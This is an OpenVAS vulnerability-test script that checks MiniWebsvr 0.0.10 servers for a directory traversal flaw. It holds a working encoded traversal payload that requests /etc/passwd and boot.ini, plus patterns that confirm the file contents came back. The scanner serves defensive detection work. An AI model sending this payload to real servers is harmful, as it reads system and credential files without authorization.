###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_miniwebsvr_40133.nasl 14233 2019-03-16 13:32:43Z mmartin $
#
# MiniWebsvr URI Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################


if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100638");
  script_version("$Revision: 14233 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-16 14:32:43 +0100 (Sat, 16 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-05-14 12:04:31 +0200 (Fri, 14 May 2010)");
  script_bugtraq_id(40133);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_name("MiniWebsvr URI Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/40133");
  script_xref(name:"URL", value:"http://miniwebsvr.sourceforge.net/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web Servers");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("MiniWebSvr/banner");
  script_require_ports("Services/www", 8080);
  script_tag(name:"summary", value:"MiniWebsvr is prone to a directory-traversal vulnerability because it
fails to sufficiently sanitize user-supplied input.

Exploiting this issue will allow an attacker to traverse through
arbitrary directories and gain access to sensitive information.

MiniWebsvr 0.0.10 is vulnerable. Other versions may also be affected.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:8080);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port: port);
if(!banner || "MiniWebSvr" >!< banner)exit(0);

trav = "/c0.%c0./%c0.%c0./%c0.%c0./c0.%c0./%c0.%c0./%c0.%c0./c0.%c0./%c0.%c0./%c0.%c0./c0.%c0./%c0.%c0./%c0.%c0./c0.%c0./%c0.%c0./%c0.%c0./c0.%c0./%c0.%c0./%c0.%c0./c0.%c0./%c0.%c0./%c0.%c0./";

files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");

foreach file (keys(files)) {

  url = trav + files[file];

  if(http_vuln_check(port:port, url:url, pattern:file)) {
    security_message(port:port);
    exit(0);
  }

}

exit(0);
